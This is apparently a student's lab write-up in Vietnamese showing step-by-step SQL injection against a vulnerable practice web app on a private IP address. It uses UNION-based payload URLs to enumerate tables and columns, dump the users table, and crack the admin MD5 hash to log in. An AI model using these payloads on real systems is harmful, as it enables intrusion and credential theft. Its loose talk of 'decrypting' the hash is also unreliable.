### Người thực hiện: Trần Ngọc Nam
### Thời gian thực hiện: 30/03/2022

# Cách làm:
- Check xem web có bị lỗi sql injection không? SQL có 2 dạng để check: dựa trên số(?id=1) hoặc dạng chuỗi(string). Nhưng dựa theo cấu trúc web nên ta chọn check theo id.
  - Đầu tiên, ta thử chèn dấu ' vào http://192.168.216.129/cat.php?id=1
  ```php
    Thanh URL sẽ có dạng: http://192.168.216.129/cat.php?id=1'

    Kết quả trả về:
    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
  ```
  - Điều này chưa kết luận được web có lỗi sql injection không. Nên ta tiếp thực thử truyền phép tính vào url
  ```php
    Thanh URL sẽ có dạng: http://192.168.216.129/cat.php?id=2-1
  ```
  - Kết quả trả về là trang http://192.168.216.129/cat.php?id=1. Chứng tỏ web có thể lỗi sql injection.
  - Ta thực hiện thêm 1 lần truyền phép tính vào thanh url
  ```php
    Thanh URL sẽ có dạng: http://192.168.216.129/cat.php?id=3-2
  ```
  - Kết quả trả về vẫn là trang http://192.168.216.129/cat.php?id=1. Chứng tỏ web đã lỗi sql injection.

- Tiếp theo, ta check số cột của database bằng toán tử union. Ta check số lượng từ 1 và tăng dần
  ```php
    http://192.168.216.129/cat.php?id=1 union select 1
    http://192.168.216.129/cat.php?id=1 union select 1,2
    http://192.168.216.129/cat.php?id=1 union select 1,2,3
    http://192.168.216.129/cat.php?id=1 union select 1,2,3,4
  ```
- Ta nhận thấy số cột là 4 khi thử đến lần thứ 4 trang web trả về tất cả iteam trong trang web
- Ta nhận thấy số cột là 4 khi thử đến lần thứ 4 trang web trả về tất cả iteam trong trang web
  ```php
  http://192.168.216.129/cat.php?id=1 union select 1,@@version,3,4

  Kết quả trả về: 5.1.63-0+squeeze1
  ```
- Tiếp theo, ta check tên các table có trong database
  ```php
  http://192.168.216.129/cat.php?id=1 union select 1,table_name,3,4 from information_schema.tables
  ``` 
- Kết quả trả về gồm rất nhiều table như sau:

    | No. | Table                                          |
    | --- | ---------------------------------------------- |
    | 1   | picture: ruby                                  |
    | 2   | picture: cthulhu                               |
    | 3   | picture: character_sets                        |
    | 4   | picture: collations                            |
    | 5   | picture: collation_character_set_applicability |
    | 6   | picture: columns                               |
    | 7   | picture: column_privileges                     |
    | 8   | picture: engines                               |
    | 9   | picture: events                                |
    | 10  | picture: files                                 |
    | 11  | picture: global_status                         |
    | 12  | picture: global_variables                      |
    | 13  | picture: key_column_usage                      |
    | 14  | picture: partitions                            |
    | 15  | picture: plugins                               |
    | 16  | picture: processlist                           |
    | 17  | picture: profiling                             |
    | 18  | picture: referential_constraints               |
    | 19  | picture: routines                              |
    | 20  | picture: schemata                              |
    | 21  | picture: schema_privileges                     |
    | 22  | picture: session_status                        |
    | 23  | picture: session_variables                     |
    | 24  | picture: statistics                            |
    | 25  | picture: tables                                |
    | 26  | picture: table_constraints                     |
    | 27  | picture: table_privileges                      |
    | 28  | picture: triggers                              |
    | 29  | picture: user_privileges                       |
    | 30  | picture: views                                 |
    | 31  | picture: categories                            |
    | 32  | picture: pictures                              |
    | 33  | picture: users                                 |

- Nhưng ở đây, ta sẽ quan tâm tới table users. Đây sẽ là nơi chứa thông tin của các user trong database
- Đầu tiên, ta cần biết số lượng cột và tên từng cột trong bảng users
  ```php
  http://192.168.216.129/cat.php?id=1 union select 1,column_name,3,4 from information_schema.columns where table_name='users'
  ```
- Kết quả trả về gồm 3 cột với tên lần lượt là: id, login, password
- Từ đây, ta có thể dễ dàng show ra thông tin toàn bộ users
  ```php
  http://192.168.216.129/cat.php?id=1 union select 1,concat(id,0x3a,login,0x3a,password),3,4 from users

  Kết quả trả về: 1:admin:8efe310f9ab3efeae8d410a8e0166eb2
  ```
- Đây là thông tin về admin, giờ chúng ta thử đăng nhập. Nhưng không thành công, có thể suy đoán mật khẩu đã được mã hóa.
- Ta sẽ thử giải nén mật khẩu. Và sau khi thử các cách giải mã: DES, 3DES, AES, SHA, MD5,.. thì password nhận được là P4ssw0rd.
- Đến đây ta đã có thông tin username: admin, password: P4ssw0rd. Và bây giờ ta đã có thể đăng nhập thành công và tùy ý thêm và xóa các bức tranh.